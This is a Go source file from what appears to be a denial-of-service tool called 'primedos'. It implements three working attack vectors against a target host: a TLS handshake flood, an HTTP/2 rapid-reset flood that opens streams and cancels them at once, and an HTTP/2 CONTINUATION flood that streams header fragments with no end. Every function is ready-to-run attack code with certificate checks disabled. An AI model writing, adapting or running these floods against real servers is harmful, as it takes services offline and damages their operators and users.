package vectors

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"

	"primedos/internal/core"
)

func dialH2(ctx context.Context, w *core.Worker) (net.Conn, error) {
	d := &net.Dialer{Timeout: w.S.Cfg.Timeout()}
	raw, err := d.DialContext(ctx, "tcp", w.S.Tgt.Addr())
	if err != nil {
		return nil, err
	}
	tc := tls.Client(raw, &tls.Config{
		InsecureSkipVerify: true,
		ServerName:         w.S.Tgt.Host,
		MinVersion:         tls.VersionTLS12,
		NextProtos:         []string{"h2"},
	})
	if err := tc.HandshakeContext(ctx); err != nil {
		raw.Close()
		return nil, err
	}
	if tc.ConnectionState().NegotiatedProtocol != "h2" {
		tc.Close()
		return nil, fmt.Errorf("сервер не согласовал h2")
	}
	return tc, nil
}

func TLSFlood(ctx context.Context, w *core.Worker) error {
	for ctx.Err() == nil {
		d := &net.Dialer{Timeout: w.S.Cfg.Timeout()}
		c, err := tls.DialWithDialer(d, "tcp", w.S.Tgt.Addr(), &tls.Config{
			InsecureSkipVerify:     true,
			ServerName:             w.S.Tgt.Host,
			MinVersion:             tls.VersionTLS12,
			SessionTicketsDisabled: true,
			ClientSessionCache:     nil,
		})
		if err != nil {
			if ctx.Err() != nil {
				return nil
			}
			w.Error()
			continue
		}
		w.Conn()
		w.Account(3300, 0, 9, 0)
		c.Close()
	}
	return nil
}

func H2Reset(ctx context.Context, w *core.Worker) error {
	for ctx.Err() == nil {
		c, err := dialH2(ctx, w)
		if err != nil {
			if ctx.Err() != nil {
				return nil
			}
			w.Error()
			continue
		}
		w.Conn()
		w.Account(2900, 0, 8, 0)
		h2ResetLoop(ctx, w, c)
		c.Close()
	}
	return nil
}

func h2ResetLoop(ctx context.Context, w *core.Worker, c net.Conn) {
	if _, err := c.Write([]byte(http2.ClientPreface)); err != nil {
		return
	}
	fw := http2.NewFramer(c, nil)
	fr := http2.NewFramer(io.Discard, c)
	if err := fw.WriteSettings(); err != nil {
		return
	}
	go func() {
		for {
			if _, err := fr.ReadFrame(); err != nil {
				return
			}
		}
	}()

	var buf bytes.Buffer
	enc := hpack.NewEncoder(&buf)
	streamID := uint32(1)
	path := w.S.RandomPath(w.R)
	ua := w.S.RandomUA(w.R)

	for ctx.Err() == nil {
		if streamID > (1 << 30) {
			return
		}
		buf.Reset()
		enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
		enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: w.S.Tgt.Scheme})
		enc.WriteField(hpack.HeaderField{Name: ":authority", Value: w.S.Tgt.HostHeader()})
		enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
		enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: ua})
		if err := fw.WriteHeaders(http2.HeadersFrameParam{
			StreamID:      streamID,
			BlockFragment: buf.Bytes(),
			EndHeaders:    true,
		}); err != nil {
			return
		}
		if err := fw.WriteRSTStream(streamID, http2.ErrCodeCancel); err != nil {
			return
		}
		streamID += 2
		w.Account(220, 0, 2, 1)
	}
}

func ContinuationFlood(ctx context.Context, w *core.Worker) error {
	for ctx.Err() == nil {
		c, err := dialH2(ctx, w)
		if err != nil {
			if ctx.Err() != nil {
				return nil
			}
			w.Error()
			continue
		}
		w.Conn()
		w.Account(2900, 0, 8, 0)

		if _, err := c.Write([]byte(http2.ClientPreface)); err != nil {
			c.Close()
			continue
		}
		fw := http2.NewFramer(c, nil)
		fr := http2.NewFramer(io.Discard, c)
		if err := fw.WriteSettings(); err != nil {
			c.Close()
			continue
		}
		go func() {
			for {
				if _, err := fr.ReadFrame(); err != nil {
					return
				}
			}
		}()

		var buf bytes.Buffer
		enc := hpack.NewEncoder(&buf)
		enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
		enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: w.S.Tgt.Scheme})
		enc.WriteField(hpack.HeaderField{Name: ":authority", Value: w.S.Tgt.HostHeader()})
		enc.WriteField(hpack.HeaderField{Name: ":path", Value: w.S.RandomPath(w.R)})

		if err := fw.WriteHeaders(http2.HeadersFrameParam{
			StreamID:      1,
			BlockFragment: buf.Bytes(),
			EndHeaders:    false,
		}); err != nil {
			c.Close()
			continue
		}
		payload := []byte("x")
		for ctx.Err() == nil {
			if err := fw.WriteContinuation(1, false, payload); err != nil {
				break
			}
			w.Account(15, 1, 1, 0)
		}
		c.Close()
	}
	return nil
}
